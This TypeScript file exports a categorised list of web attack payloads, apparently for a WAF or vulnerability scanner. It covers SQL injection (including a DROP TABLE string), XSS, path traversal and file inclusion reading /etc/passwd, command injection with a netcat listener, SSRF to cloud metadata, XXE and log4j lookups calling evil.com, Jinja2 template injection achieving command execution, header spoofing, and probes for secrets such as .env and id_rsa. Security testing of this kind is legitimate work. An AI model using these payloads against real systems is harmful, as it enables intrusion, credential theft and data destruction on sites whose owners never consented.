export type PayloadCategory = {
  type: 'ParamCheck' | 'FileCheck' | 'Header';
  payloads: string[];
};

export const PAYLOADS: Record<string, PayloadCategory> = {
  "SQL Injection": {
    type: "ParamCheck",
    payloads: [
      "' OR '1'='1",
      "1; DROP TABLE notablewaftest17 --",
      "admin' --",
      "' OR 1=1--",
      "' OR 'a'='a",
      "' OR 1=1#",
      "' OR 1=1/*",
      "' OR SLEEP(5)--",
      "' OR 1=1 LIMIT 1;--",
      "WAITFOR DELAY '0:0:5'",
      ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "%2553%2527%2520OR%25201%253D1",  // URL encoded bypass
      "/**/OR/**/1=1",  // Comment bypass
    ]
  },
  "XSS": {
    type: "ParamCheck",
    payloads: [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "<iframe src=\"javascript:alert('XSS')\"></iframe>",
      "<svg/onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<a href=javascript:alert('xss')>click</a>",
      "<math href=javascript:alert(1)>",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
      "<marquee onstart=alert(1)>",
      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
      "<input onfocus=alert(1) autofocus>",
    ]
  },
  "Path Traversal": {
    type: "ParamCheck",
    payloads: [
      "../../etc/passwd",
      "../../../../../../../etc/passwd",
      "..\\..\\..\\..\\..\\..\\windows\\win.ini",
      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ]
  },
  "Command Injection": {
    type: "ParamCheck",
    payloads: [
      "$(cat /etc/passwd)",
      "| cat /etc/passwd",
      "; ls -la",
      "& whoami",
      "| id",
      "; ping -c 10 127.0.0.1",
      "| nc -lvp 4444"
    ]
  },
  "SSRF": {
    type: "ParamCheck",
    payloads: [
      "http://127.0.0.1/",
      "file:///etc/passwd",
      "http://127.0.0.1/latest/meta-data/",
      "http://localhost:80/",
      "http://0.0.0.0:80/",
      "http://[::1]/",
      "http://example.com@127.0.0.1/",
      "http://169.254.169.254/latest/meta-data/",  // AWS metadata
      "http://[::ffff:127.0.0.1]",  // IPv6 bypass
      "http://127.1",  // Short notation
      "http://0177.0.0.1",  // Octal bypass
      "http://2130706433",  // Decimal bypass
    ]
  },
  "NoSQL Injection": {
    type: "ParamCheck",
    payloads: [
      "{'$gt':''}",
      '{"$ne":null}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$where": "this.password == this.passwordConfirm"}',
      '{"$or": [{}, {}]}'
    ]
  },
  "Local File Inclusion": {
    type: "ParamCheck",
    payloads: [
      "php://filter/convert.base64-encode/resource=index.php",
      "/etc/passwd",
      "../../../../../../../../etc/passwd",
      "..\\..\\..\\..\\windows\\win.ini",
      "/proc/self/environ",
      "index.php%00.jpg"  // Null byte injection bypass
    ]
  },
  "LDAP Injection": {
    type: "ParamCheck",
    payloads: [
      "*)(|(uid=*))",
      "*))(objectClass=*))(|(objectClass=*)",
      "admin)(|(password=*))"
    ]
  },
  "HTTP Request Smuggling": {
    type: "ParamCheck",
    payloads: [
      "Transfer-Encoding: chunked\r\n0\r\n\r\nGARBAGE",
      "0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com"
    ]
  },
  "Open Redirect": {
    type: "ParamCheck",
    payloads: [
      "//evil.com",
      "http://evil.com",
      "/\\evil.com",
      "//google.com%2F%2Fevil.com"
    ]
  },
  "Sensitive Files": {
    type: "FileCheck",
    payloads: [
      ".git",
      ".git/config",
      ".gitignore",
      "requirements.txt",
      "composer.json",
      "composer.lock",
      "package.json",
      "package-lock.json",
      "yarn.lock",
      "config.php",
      "wp-config.php",
      ".env",
      "docker-compose.yml",
      "id_rsa",
      "id_rsa.pub",
      "web.config",
      "appsettings.json",
      "database.yml",
      ".htpasswd",
      ".htaccess"
    ]
  },
  "CRLF Injection": {
    type: "ParamCheck",
    payloads: [
      "%0d%0aSet-Cookie: malicious=true",
      "\r\nLocation: http://malicious.com",
      "%0d%0aContent-Length:0"
    ]
  },
  "UTF8/Unicode Bypass": {
    type: "ParamCheck",
    payloads: [
      "\\u0027 OR \\u00271\\u0027=\\u00271",  // Unicode encoded SQL injection
      "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",  // UTF-8 encoded with fancy quotes
      "Ω OR Ω=Ω"  // Using Unicode omega characters
    ]
  },
  "XXE": {
    type: "ParamCheck",
    payloads: [
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
      "<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",
      "<?xml version=\"1.0\"?><foo>&xxe;</foo>",
      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>"
    ]
  },
  "SSTI": {
    type: "ParamCheck",
    payloads: [
      "{{7*7}}",  // Jinja2
      "${7*7}",   // Velocity
      "<%= 7*7 %>", // ERB
      "{{=7*7}}", // Twig
      "#{7*7}",    // Ruby
      "{{7*'7'}}", // Jinja2 string multiplication
      "{{config}}", // Jinja2 variable leak
      "{{self}}",   // Jinja2 self leak
      "{{[].__class__.__mro__[1].__subclasses__()}}", // Jinja2 class leak
      "{{().__class__.__bases__[0].__subclasses__()}}", // Python
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", // Jinja2 RCE
      "<%={{7*7}}%>", // AngularJS
      "${{7*7}}", // Go templates
      "{{request}}", // Flask/Jinja2
      "{{url_for}}", // Flask/Jinja2
      "{{cycler.__init__.__globals__.os.popen('id').read()}}" // Jinja2 RCE
    ]
  },
  "HTTP Parameter Pollution": {
    type: "ParamCheck",
    payloads: [
      "param=1&param=2",
      "user=admin&user=guest",
      "id=1;id=2",
      "param=1&&param=2",
      "param=1;param=2",
      "param=1,param=2",
      "param=1 param=2",
      "param=1&param=",
      "param=&param=2",
      "param=1&Param=2",
      "param[0]=1&param[1]=2",
      "param[]=1&param[]=2",
      "param=1&%70%61%72%61%6d=2",
      "param=1&par%61m=2",
      "param.1=1&param.2=2",
      "param=1|param=2",
      "param[a]=1&param[b]=2"
    ]
  },
  "Web Cache Poisoning": {
    type: "Header",
    payloads: [
      "X-Forwarded-Host: evil.com",
      "X-Original-URL: /admin",
      "Cache-Control: no-cache",
      "X-Forwarded-Proto: https",
      "X-Host: evil.com",
      "X-Forwarded-Scheme: javascript://",
      "X-HTTP-Method-Override: PURGE",
      "X-Forwarded-Server: evil.com",
      "X-Forwarded-Port: 443",
      "X-Original-Host: evil.com"
    ]
  },
  "IP Bypass": {
    type: "Header",
    payloads: [
      "X-Forwarded-For: 127.0.0.1",
      "X-Remote-IP: 127.0.0.1",
      "X-Remote-Addr: 127.0.0.1",
      "X-Client-IP: 127.0.0.1",
      "X-Real-IP: 127.0.0.1",
      "X-Forwarded-For: 127.0.0.1, evil.com",
      "X-Forwarded-For: 127.0.0.1, 2130706433",
      "X-Forwarded-For: 127.0.0.1, localhost",
      "X-Forwarded-For: 127.0.0.1, 0.0.0.0",
      "X-Forwarded-For: 127.0.0.1, ::1",
      "X-Forwarded-For: 127.0.0.1, 0177.0.0.1",
      "X-Forwarded-For: 127.0.0.1, 127.1"
    ]
  },
  "User-Agent": {
    type: "Header",
    payloads: [
      "User-Agent:", // пустой
      "User-Agent: \x00", // нуль-байт
      "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)", // Googlebot
      "User-Agent: {{7*7}}", // SSTI
      "User-Agent: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", // XXE
      "User-Agent: <script>alert('xss')</script>", // XSS
      "User-Agent: %0d%0aSet-Cookie: injected=true", // CRLF
      "User-Agent: ' OR '1'='1", // SQLi
      "User-Agent: *)(uid=*))(|(uid=*)", // LDAP
      "User-Agent: ${jndi:ldap://evil.com/a}" // log4j
    ]
  }
};
